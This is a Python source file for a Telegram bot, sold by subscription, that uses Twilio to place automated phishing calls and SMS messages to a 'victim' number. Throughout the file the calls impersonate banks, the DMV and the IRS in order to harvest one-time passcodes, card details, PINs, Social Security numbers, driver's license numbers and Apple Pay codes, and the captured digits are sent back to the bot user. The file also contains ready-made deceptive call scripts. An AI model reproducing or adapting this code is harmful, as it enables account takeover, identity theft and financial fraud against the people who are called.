import requests
import time
import phonenumbers
import telebot
import twilio
import sqlite3
import flask
from datetime import *
from flask import Flask, session
#from flask_session import Session
from phonenumbers import NumberParseException
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.twiml.messaging_response import MessagingResponse
from flask import Flask, request
from telebot import types
from twilio.rest import Client
from Database import *
from Info import *

path = 'UsersDatabase.db'
conn = sqlite3.connect(path, check_same_thread=False)

c = conn.cursor()

# Twilio connection
client = Client(account_sid, auth_token)

# Flask connection
app = Flask(__name__)

# Bot connection
bot = telebot.TeleBot(API_TOKEN, threaded=False)
bot.remove_webhook()
bot.set_webhook(url=callurl)



# Process webhook calls
@app.route('/', methods=['GET', 'POST'])
def webhook():
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        print("error")
        flask.abort(403)

# Handle '/start'
@bot.message_handler(commands=['start'])
def send_welcome(message):
    id = message.from_user.id
    print(id)
    print(check_user(id))
    print(check_admin(id))
    print(fetch_expiry_date(id))
    if check_admin(id) == True:
        if check_user(id) != True:
            create_user_lifetime(id)
        else:
            pass
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="User Mode")
        item2 = types.KeyboardButton(text="Admin Mode")
        keyboard.add(item1)
        keyboard.add(item2)
        send = bot.send_message(message.chat.id, "*Welcome\n\nWould You Like to Be In User or Admin Mode?*",parse_mode='Markdown',
                                reply_markup=keyboard)
    elif (check_user(id) == True) and check_expiry_days(id) > 0:
        days_left = check_expiry_days(id)
        name = message.from_user.first_name
        send = bot.send_message(message.chat.id, f"*Hey {name} 👋\n⚠️You have {days_left} days left❗️* ",parse_mode='Markdown')
        send = bot.send_message(message.chat.id, "*▫️Send Victim's Phone Number📱\n\nUse International Format (+) ❗️*",parse_mode='Markdown')
        bot.register_next_step_handler(send, saving_phonenumber)
    else:
        send = bot.send_message(message.chat.id,
                                "*〽️TO USE THIS BOT YOU MUST BUY SUBSCRIPTION️\n\n ️️Contact @ProfessorNardos TO BUY️*", parse_mode='Markdown')


def saving_phonenumber(message):
    userid = message.from_user.id
    no_tobesaved = str(message.text)
    z = phonenumbers.parse(no_tobesaved, "US")
    try:
        if phonenumbers.is_valid_number(z) == True and phonenumbers.is_valid_number(z) == True:
            save_phonenumber(no_tobesaved, userid)
            send = bot.send_message(message.chat.id, "*▫️Number confirmed ☑️\n\nType OK to Continue*", parse_mode='Markdown')
            bot.register_next_step_handler(send, call_or_sms_or_script)
        else:
            bot.send_message(message.chat.id,
                             "*▫️Invalid Number ❌ Use ️US numbers ONLY.\n▫️Use /start Command To Restart The Bot.*", parse_mode='Markdown')
    except phonenumbers.NumberParseException:
        bot.send_message(message.chat.id, "*Invalid Number ❌\n▫️Use /start Command To Restart The Bot*",  parse_mode='Markdown')


#def pick_user_or_admin(message):
#    if message.text == 'User Mode':
#
#    elif message.text == 'Admin Mode':
#        send = bot.send_message(message.chat.id, "Hey Admin 👑\n*Type “Ok” to continue*", parse_mode='Markdown')
#        bot.register_next_step_handler(send, adminfunction)
#    else:
#        send = bot.send_message(message.chat.id,
#                                "Invalid Option ❌\nUse /start command")

def call_or_sms_or_script(message):
    userid = message.from_user.id
    name = message.from_user.first_name
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Call Mode")
    item3 = types.KeyboardButton(text="SMS Mode")
    item4 = types.KeyboardButton(text="Custom Script")
    keyboard.add(item1)
    keyboard.add(item3)
    keyboard.add(item4)
    bot.send_message(message.chat.id, f"*️️What Mode Do you want?*", reply_markup=keyboard,  parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Call Mode")
def call_mode(message):
    send = bot.send_message(message.chat.id, "*▫️Welcome to Call Mode📞\n\n️️Type OK to Continue*", parse_mode='Markdown')
    bot.register_next_step_handler(send, card_or_Otp)

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "SMS Mode")
def sms_mode(message):
    send = bot.send_message(message.chat.id,"*Okay ✅ \n▫️Send The Service Name 📡*", parse_mode='Markdown')
    bot.register_next_step_handler(send, sms_mode2)

def sms_mode2(message):
    bankname = message.text
    userid = message.from_user.id
    save_bankName(bankname, userid)
    send = bot.send_message(message.chat.id, "*Okay✅\n\n Send 'text' to Send Message Now📩*", parse_mode='Markdown')
    bot.register_next_step_handler(send, send_text)

def send_text(message):
    # global userid
    # global chat_id
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    ph_no = fetch_phonenumber(userid)
    bankname = fetch_bankname(userid)
    print(ph_no)
    try:
        sms_message = client.messages.create(
            body=f'This is an automated message from {bankname}.\n\nThere has been a suspicious attempt to login to your account, and we need to verify your identity by confirming the phone number on file.\n\nTo block this attempt please reply with the One Time Passcode you just received. \n\nMsg&Data rates may apply.',
            from_=twiliosmsnumber,
            status_callback= callurl+'/statuscallback2/'+userid,
            to=ph_no)
    except:
        bot.send_message(chat_id, "️*An Error Has Occured ❗️ \n️Please Try Again✅*" , parse_mode='Markdown')

    else:
        print('Message sent sucessfully!')
        bot.send_message(chat_id, "*Text is getting sent 🗯..*", parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Custom Script")
def custom_script(message):
    send = bot.send_message(message.chat.id,
                            'When writing script, ensure you end script with a press one followed by pound key line\ne.g "Press 1 followed by pound key to secure account" ')
    send1 = bot.send_message(message.chat.id, "*Sample Script*", parse_mode='Markdown')
    send2 = bot.send_message(message.chat.id,
                             "Hello this is an automated call from Smiths Bank, we have detected an unauthorized access request to your account, Press 1 followed by pound key to secure account")
    send3 = bot.send_message(message.chat.id,
                             "*use commas where fullstops should be and use commas where commas should be also*",
                             parse_mode='Markdown')
    send3 = bot.send_message(message.chat.id, "Please enter script: ")
    bot.register_next_step_handler(send, savings_script)

def savings_script(message):
    script_tobesaved = message.text
    userid = message.from_user.id
    save_script(script_tobesaved,userid)
    send = bot.send_message(message.chat.id, "*Your script has been saved for one time use.\n\nsend 'ok' *",parse_mode='Markdown')
    bot.register_next_step_handler(send, enter_options)

def enter_options(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="1")
    item2 = types.KeyboardButton(text="2")
    keyboard.add(item1, item2)
    send = bot.reply_to(message, " Enter number of input options for victim: ",
                        reply_markup=keyboard)
    bot.register_next_step_handler(send, saving_options0)

def saving_options0(message):
    userid = message.from_user.id
    option_number = message.text
    save_option_number(option_number,userid)
    if option_number == "1":
        send0 = bot.send_message(message.chat.id,
                                'Be sure to end text with \n"followed by pound key" \n\n(e.g "Please enter your 9 digit SSN followed by pound key" )')
        send = bot.send_message(message.chat.id,"Please enter input option:")
        bot.register_next_step_handler(send, saving_options1)

    elif option_number == "2":
        send = bot.send_message(message.chat.id,
                                'Be sure to end text with \n"followed by pound key" \n\n(e.g "Please enter your 9 digit SSN followed by pound key" )')
        send = bot.send_message(message.chat.id,"Please enter your first input option:")
        bot.register_next_step_handler(send, saving_options2)

    else:
        send = bot.send_message(message.chat.id,"You have selected an invalid option\n\nPlease use the /start command again")

def saving_options1(message):
    userid = message.from_user.id
    try:
        option1 = message.text
        save_option1(option1,userid)
    except TypeError:
        bot.send_message(message.chat.id, "Your input option should be text!\n\nUse /Help command for more info\nUse /start command to start continue ")
    else:
        send = bot.send_message(message.chat.id, "Success! Say 'call' to call now")
        bot.register_next_step_handler(send, making_call_custom)


def saving_options2(message):
    userid = message.from_user.id
    try:
        option1 = message.text
        save_option1(option1,userid)
    except TypeError:
        bot.send_message(message.chat.id, "Your input option should be text!\n\nUse /Help command for more info\nUse /start command to continue ")
    else:
        send = bot.send_message(message.chat.id, "Please enter your second input option: ")
        bot.register_next_step_handler(send, saving_options3)

def saving_options3(message):
    userid = message.from_user.id
    try:
        option2 = message.text
        save_option2(option2, userid)
    except TypeError:
        bot.send_message(message.chat.id, "Your input option should be text!\n\nUse /Help command for more info\nUse /start command to continue ")
    else:
        send = bot.send_message(message.chat.id, 'Success! Say "call" to call now')
        bot.register_next_step_handler(send, making_call_custom)


def making_call_custom(message):
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    ph_no = fetch_phonenumber(userid)
    print(ph_no)
    try:
        call = client.calls.create(record=True,
                                   status_callback=(callurl + '/statuscallback/'+userid),
                                   recording_status_callback=(callurl + '/details_rec/'+userid),
                                   status_callback_event=['ringing', 'answered', 'completed'],
                                   url=(callurl + '/custom/'+userid),
                                   to=ph_no,
                                   from_=twilionumber,
                                   machine_detection='Enable')
    except:
        bot.send_message(message.chat.id, "Sorry I am currently unable to make calls\n\nContact Admin")
    else:
        print(call.sid)
        send = bot.send_message(message.chat.id, "*Calling ☎️...*",parse_mode='Markdown')



def card_or_Otp(message):
    userid = message.from_user.id
    name = message.from_user.first_name
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Grab Card Details 💳")
    item2 = types.KeyboardButton(text="Grab Account # 🏦")
    item3 = types.KeyboardButton(text="Grab PIN 📌")
    item4 = types.KeyboardButton(text="Grab OTP 🤖")
    item5 = types.KeyboardButton(text="Grab Apple Pay 🍎")
    item6 = types.KeyboardButton(text="Grab SSN 👤")
    item7 = types.KeyboardButton(text="Grab DL # 🚘")
    keyboard.add(item1)
    keyboard.add(item2, item7)
    keyboard.add(item3, item4)
    keyboard.add(item5,item6)
    bot.send_message(message.chat.id, f"️*️Please Choose An Option⚙️*", reply_markup=keyboard, parse_mode='Markdown')
    
    
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Grab Apple Pay 🍎")
def grab_apple_pay(message):
    userid = message.from_user.id
    send = bot.send_message(message.chat.id,
                            "*Okay ✅ \n▫️Send The Service Name 📡*", parse_mode='Markdown')
    bot.register_next_step_handler(send, grab_apple_pay1)

def grab_apple_pay1(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    send = bot.send_message(message.chat.id, '*Okay✅ Try To Login and Send “Call” to begin the call.*',parse_mode='Markdown')
    bot.register_next_step_handler(send, make_call_apple)

def make_call_apple(message):
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    phonenumber = fetch_phonenumber(userid)
    print(phonenumber)

    call = client.calls.create(record=True,
                                   status_callback=(callurl + '/statuscallback/'+userid),
                                   recording_status_callback=(callurl + '/details_rec/'+userid),
                                   status_callback_event=['ringing', 'answered', 'completed'],
                                   url=(callurl + '/appl_py/'+userid),
                                   to=phonenumber,
                                   from_=twilionumber,
                               machine_detection='DetectMessageEnd')
    print(call.sid)
    bot.send_message(message.chat.id, "*Calling ☎️...*",parse_mode='Markdown')


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Grab SSN 👤")
def grab_ssn(message):
    send = bot.send_message(message.chat.id, 'Ok! Reply “Call” to begin the call 👤')
    bot.register_next_step_handler(send, make_call_ssn)
    
def make_call_ssn(message):
    # global userid
    # global chat_id
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    phonenumber = fetch_phonenumber(userid)
    print(phonenumber)

    call = client.calls.create(record=True,
                                   status_callback=(callurl + '/statuscallback/'+userid),
                                   recording_status_callback=(callurl + '/details_rec/'+userid),
                                   status_callback_event=['ringing', 'answered', 'completed'],
                                   url=(callurl + '/ssn_md/'+userid),
                                   to=phonenumber,
                                   from_=twilionumber,
                               machine_detection='Enable')
    print(call.sid)
    send = bot.send_message(message.chat.id, "*Calling ☎️...*",parse_mode='Markdown')


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Grab DL # 🚘")
def grab_dl_number(message):
    send = bot.send_message(message.chat.id, 'Ok! Reply “Call” to begin the call 💵')
    bot.register_next_step_handler(send, make_call_dl)


def make_call_dl(message):
    # global userid
    # global chat_id
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    phonenumber = fetch_phonenumber(userid)
    print(phonenumber)

    call = client.calls.create(record=True,
                               status_callback=(callurl + '/statuscallback/'+userid),
                               recording_status_callback=(callurl + '/details_rec/'+userid),
                               status_callback_event=['ringing', 'answered', 'completed'],
                               url=(callurl + '/dl_md/'+userid),
                               to=phonenumber,
                               from_=twilionumber,
                               machine_detection='Enable')
    print(call.sid)
    send = bot.send_message(message.chat.id, "*Calling ☎️...*",parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "User Mode")
def usecase1(message):
    name = message.from_user.first_name
    send0 = bot.send_message(message.chat.id, f"*Hey👋 {name}*", parse_mode='Markdown')
    send = bot.send_message(message.chat.id, "*️️Send Victim's Phone Number📱\n\nUse International Format (+) ❗️*", parse_mode='Markdown')
    bot.register_next_step_handler(send0, saving_phonenumber)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Admin Mode")
def usecase2(message):
    send1 = bot.send_message(message.chat.id, "Hey Admin 👑\n*Type “Ok” to continue*", parse_mode='Markdown')
    bot.register_next_step_handler(send1, adminfunction)

def adminfunction(message):
    userid = message.from_user.id
    name = message.from_user.first_name
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    keyboard.row_width = 1
    item = types.KeyboardButton(text="Edit access")
    keyboard.add(item)
    bot.send_message(message.chat.id, f"*️️Please Choose An Option⚙️*", reply_markup=keyboard, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def how_to_help(message):
    bot.send_message(message.chat.id, "• Contact @undefined_bot 👑\n\n• Use /faq for more help")


@bot.message_handler(commands=['faq'])
def how_faq(message):
    bot.send_message(message.chat.id, "• Please Contact @undefined_bot FOr Usage Tutorial")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Edit access")
def edit_access(message):
    userid = message.from_user.id
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 4
    item1 = types.KeyboardButton(text="1 : Add Admin")
    item2 = types.KeyboardButton(text="2 : Add User")
    item3 = types.KeyboardButton(text="3 : Delete Admin")
    item4 = types.KeyboardButton(text="4 : Delete User")
    keyboard.add(item1, item2)
    keyboard.add(item3, item4)
    bot.send_message(message.chat.id, "*Okay✅*", reply_markup=keyboard,parse_mode='Markdown')


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "1 : Add Admin")
def add_admin(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *",parse_mode='Markdown')
    bot.register_next_step_handler(send, save_id_admin)


def save_id_admin(message):
    adminid = message.text
    create_admin(adminid)
    create_user_lifetime(adminid)
    bot.send_message(message.chat.id, f"▫*️Done This User Is Now Admin✅\n\n Use /start to Continue*",parse_mode='Markdown')


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "2 : Add User")
def type_of_user(message):
    userid = message.from_user.id
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 4
    item1 = types.KeyboardButton(text="Test")
    item2 = types.KeyboardButton(text="7 days")
    item3 = types.KeyboardButton(text="1 month")
    item4 = types.KeyboardButton(text="3 months")
    item5 = types.KeyboardButton(text="Lifetime")
    keyboard.add(item1)
    keyboard.add(item2)
    keyboard.add(item3)
    keyboard.add(item4)
    keyboard.add(item5)
    bot.send_message(message.chat.id, "*Okay✅*", reply_markup=keyboard, parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Test")
def add_user(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, createtest_user)


def createtest_user(message):
    try:
        name = message.from_user.first_name
        userid = message.text
        create_user_test(userid)
        bot.send_message(message.chat.id, f"*User Added for Test calls✅\n\n Use /start to Continue*", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "*Invalid Option ❌\nUse /start command*", parse_mode='Markdown')

        return ''



@bot.message_handler(content_types=["text"], func=lambda message: message.text == "7 days")
def add_user(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, create7days_user)


def create7days_user(message):
    try:
        name = message.from_user.first_name
        userid = message.text
        create_user_7days(userid)
        bot.send_message(message.chat.id, f"*User Added for 7 days✅ \n\n"
                                          "Use /start to Continue*",parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id,  "*Invalid Option ❌\nUse /start command*", parse_mode='Markdown')
        return ''

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "1 month")
def add_user(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *",parse_mode='Markdown')
    bot.register_next_step_handler(send, create1month_user)


def create1month_user(message):
    try:
        name = message.from_user.first_name
        userid = message.text
        create_user_1month(userid)
        bot.send_message(message.chat.id, f"*User Added for 1 Month✅ \n\n"
                                          "Use /start to Continue*",parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id,  "*Invalid Option ❌\nUse /start command*", parse_mode='Markdown')
        return ''

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "3 months")
def add_user(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, create3months_user)


def create3months_user(message):
    try:
        name = message.from_user.first_name
        userid = message.text
        create_user_3months(userid)
        bot.send_message(message.chat.id, f"*User Added for 3 Month✅ \n\n"
                                          "Use /start to Continue*",parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id,  "*Invalid Option ❌\nUse /start command*", parse_mode='Markdown')
        return ''
@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Lifetime")
def add_user(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, create_user_lifetime)


def create_lifetime_user(message):
    try:
        name = message.from_user.first_name
        userid = message.text
        create_user_lifetime(userid)
        bot.send_message(message.chat.id, f"*User Added for Lifetime✅ \n\n"
                                          "Use /start to Continue*",parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id,  "*Invalid Option ❌\nUse /start command*", parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "3 : Delete Admin")
def delete_admin(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, delete_id_admin)


def delete_id_admin(message):
    userid = message.text
    delete_specific_AdminData(userid)
    delete_specific_UserData(userid)
    bot.send_message(message.chat.id, f"*Admin Deleted✅\n\n Use /start to Continue*",parse_mode='Markdown')


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "4 : Delete User")
def delete_user(message):
    send = bot.send_message(message.chat.id, "*Enter UserID: *", parse_mode='Markdown')
    bot.register_next_step_handler(send, delete_id_user)


def delete_id_user(message):
    userid = message.text
    delete_specific_UserData(userid)
    bot.send_message(message.chat.id, f"*User Deleted✅ \n\n"
                                      "Use /start to Continue*",parse_mode='Markdown')


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab Card Details 💳")
def presses_1(message):
    userid = message.from_user.id
    send = bot.send_message(message.chat.id,
                            "*Okay ✅ \n▫️Send The Service Name 📡*", parse_mode='Markdown')
    bot.register_next_step_handler(send, noname1)


def noname1(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    send = bot.send_message(message.chat.id, '*Okay✅ Try To Login and Send “Call” to begin the call.*',parse_mode='Markdown')
    bot.register_next_step_handler(send, make_call_card)


def make_call_card(message):
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    phonenumber = fetch_phonenumber(userid)
    print(phonenumber)

    call = client.calls.create(record=True,
                               status_callback=(callurl +'/statuscallback/'+userid),
                               recording_status_callback=(callurl + '/details_rec/'+userid),
                               status_callback_event=['ringing', 'answered', 'completed'],
                               url=(callurl + '/crdf/'+userid),
                               to=phonenumber,
                               from_=twilionumber,
                               machine_detection='Enable')
    print(call.sid)
    send = bot.send_message(message.chat.id, "*Calling ☎️...*",parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Grab Account # 🏦")
def what_service1(message):
    userid = message.from_user.id
    send = bot.send_message(message.chat.id, "*Okay ✅ \n▫️Send The Service Name 📡*", parse_mode='Markdown')
    bot.register_next_step_handler(send, save_actn)


def save_actn(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    send = bot.send_message(message.chat.id, '*Okay✅ Try To Login and Send “Call” to begin the call.*',parse_mode='Markdown')
    bot.register_next_step_handler(send, make_call_actn)


def make_call_actn(message):
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    phonenumber = fetch_phonenumber(userid)
    print(phonenumber)

    call = client.calls.create(record=True,
                               status_callback=(callurl +'/statuscallback/'+userid),
                               recording_status_callback=(callurl + '/details_rec/'+userid),
                               status_callback_event=['ringing', 'answered', 'completed'],
                               url=(callurl + '/actn/'+userid),
                               to=phonenumber,
                               from_=twilionumber,
                               machine_detection='Enable')
    print(call.sid)
    send = bot.send_message(message.chat.id, "*Calling ☎️...*",parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Grab PIN 📌")
def what_service2(message):
    userid = message.from_user.id
    send = bot.send_message(message.chat.id,
                            "*Okay ✅ \n▫️Send The Service Name 📡*", parse_mode='Markdown')
    bot.register_next_step_handler(send, noname12)


def noname12(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    send = bot.send_message(message.chat.id, '*Okay✅ Try To Login and Send “Call” to begin the call.*',parse_mode='Markdown')
    bot.register_next_step_handler(send, make_call_pin)


def make_call_pin(message):
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    phonenumber = fetch_phonenumber(userid)
    print(phonenumber)

    call = client.calls.create(record=True,
                               status_callback=(callurl +'/statuscallback/'+userid),
                               recording_status_callback=(callurl + '/details_rec/'+userid),
                               status_callback_event=['ringing', 'answered', 'completed'],
                               url=(callurl + '/pin/'+userid),
                               to=phonenumber,
                               from_=twilionumber,
                               machine_detection='Enable')
    print(call.sid)
    send = bot.send_message(message.chat.id, "*Calling ☎️...*",parse_mode='Markdown')

@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Grab OTP 🤖")
def pick_bankotp(message):
    userid = message.from_user.id
    send = bot.send_message(message.chat.id, "*Okay ✅ \n▫️Send The Service Name 📡*", parse_mode='Markdown')
    bot.register_next_step_handler(send, nonameotp)

def nonameotp(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    send = bot.send_message(message.chat.id, '*Okay✅ Try To Login and Send “Call” to begin the call.*',parse_mode='Markdown')
    bot.register_next_step_handler(send, make_call_otp)

def make_call_otp(message):
    userid1 = str(message.from_user.id)
    chat_id1 = userid1
    phonenumber = fetch_phonenumber(userid1)
    print(phonenumber)
    call = client.calls.create(record=True,
                               status_callback=(callurl +'/statuscallback/'+userid1),
                               recording_status_callback=(callurl + '/details_rec/'+userid1),
                               status_callback_event=['ringing', 'answered', 'completed'],
                               url=(callurl + '/wf/'+userid1),
                               to=phonenumber,
                               from_=twilionumber,
                               machine_detection='Enable')
    print(call.sid)
    send = bot.send_message(message.chat.id, "*Calling ☎️...*",parse_mode='Markdown')

@app.route("/wf/<userid>", methods=['GET', 'POST'])
def voice_wf(userid):
    print(userid)
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherOTP/'+userid, finishOnKey='*', input="dtmf")
        gather.say(f"This is an automated call from {bankname}, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number followed by the star key, ")
        resp.append(gather)
        resp.redirect('/wf/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''


@app.route('/gatherOTP/<userid>', methods=['GET', 'POST'])
def gatherotp(userid):
    chat_id = userid
    resp = VoiceResponse()
    try:
        if 'Digits' in request.values:
            resp.say("Thank you, this attempt has been blocked! Goodbye.")
            choice = request.values['Digits']
            print(choice)
            save_otpcode(choice, userid)
            bot.send_message(chat_id, f"The collected OTP is {choice}")
            return str(resp)
        else:
            choice = 0
            save_otpcode(choice, userid)
            bot.send_message(chat_id, "No OTP was collected")
            return str(resp)
    except:
        bot.send_message(chat_id, "No OTP was collected")



@app.route("/dl_md/<userid>", methods=['GET', 'POST'])
def resp_dl_md(userid):
    chat_id = userid
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherdl_md/'+userid, finishOnKey='*', input="dtmf")
        gather.say("Hello, this is an automated message from the federal department of motor vehicles, your social security number has recently been used to purchase a 2018 Mercedes Benz E Class E 300 for $39000, in this was you please end the call, if this was not you please stay on the line, in order to confirm your identity and block this attempt, please enter your full drivers license number followed by the star key, we will be in contact within a few days to remove the impact on your credit score")
        resp.append(gather)
        resp.redirect('/dl_md/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''

@app.route("/gatherdl_md/<userid>", methods=['GET', 'POST'])
def gather_dl(userid):
    chat_id = userid
    resp = VoiceResponse()
    try:
        if 'Digits' in request.values:
            resp.say("Thank you, this attempt has been blocked! Goodbye.")
            choice = request.values['Digits']
            print(choice)
            save_dlnumber(choice, userid)
            bot.send_message(chat_id, f"The collected DL number is {choice}")
            return str(resp)
        else:
            choice = 0
            save_dlnumber(choice, userid)
            bot.send_message(chat_id, f"The collected DL number is {choice}")
            return str(resp)
    except:
        bot.send_message(chat_id, "No DL number was collected")


@app.route("/ssn_md/<userid>", methods=['GET', 'POST'])
def resp_ssn_md(userid):
    chat_id = userid
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherssn/'+userid, finishOnKey='*', input="dtmf")
        gather.say("Hello, this is an automated call from the Deparment of Internal Revenue, This will be the last attempt to reach out to you, Your social security number has recently been used to take a fifty eight thousand eight hundred and twelve dollar loan, In order for us to be in contact, we need to confirm your identity, Please enter your full Nine digit social security number followed by the star key, an advisor from the department will contact you in the next few days to discuss your cases,")
        resp.append(gather)
        resp.redirect('/ssn_md/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(chat_id, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''

@app.route("/gatherssn/<userid>", methods=['GET', 'POST'])
def gather_ssn(userid):
    chat_id = userid
    resp = VoiceResponse()
    try:
        if 'Digits' in request.values:
            resp.say("Thank you, this attempt has been blocked! Goodbye.")
            choice = request.values['Digits']
            print(choice)
            save_ssnumber(choice, userid)
            bot.send_message(chat_id, f"The collected SSN is {choice}")
            return str(resp)
        else:
            choice = 0
            save_ssnumber(choice, userid)
            bot.send_message(chat_id, f"The collected SSN is {choice}")
            return str(resp)

    except:
        bot.send_message(chat_id, "No SSN was collected")


@app.route("/appl_py/<userid>", methods=['GET', 'POST'])
def resp_apple_pay(userid):
    chat_id = userid
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    print(choice)
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherappl/'+userid, finishOnKey='*', input="dtmf")
        gather.say(f"This is an automated call from {bankname}, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number followed by the star key, ")
        resp.append(gather)
        resp.redirect('appl_py/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(chat_id, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''

@app.route("/gatherappl/<userid>", methods=['GET', 'POST'])
def gather_appl(userid):
    chat_id = userid
    resp = VoiceResponse()
    try:
        if 'Digits' in request.values:
            resp.say("Thank you, this attempt has been blocked! Goodbye.")
            choice = request.values['Digits']
            print(choice)
            save_applnumber(choice, userid)
            bot.send_message(chat_id, f"The collected Apple Pay OTP is {choice}")
            return str(resp)
        else:
            choice = 0
            save_applnumber(choice, userid)
            bot.send_message(chat_id, f"The collected Apple Pay OTP is {choice}")
            return str(resp)

    except:
        bot.send_message(chat_id, "No Apple Pay OTP was collected")



@app.route("/pin/<userid>", methods=['GET', 'POST'])
def intro_pin(userid):
    chat_id = userid
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherpin/'+userid, finishOnKey='*', input="dtmf")
        gather.say(f"Hello, this is an automated call from {bankname}, we have detected suspicious activity for a charge at Target for $56.71, If this was not you please stay on the call!, Please enter your four digit pin, followed by the star key to block this attempt")
        resp.append(gather)
        resp.redirect('/pin/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(chat_id, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''

@app.route("/gatherpin/<userid>", methods=['GET', 'POST'])
def save_pin(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        resp.say("Thank you, this attempt has been blocked! Goodbye.")
        choice = request.values['Digits']
        print(choice)
        save_atmpin(choice, userid)
        bot.send_message(chat_id, f"The collected ATM Pin is {choice}")
        return str(resp)
    else:
        bot.send_message(chat_id, "No ATM Pin was collected")
        return str(resp)

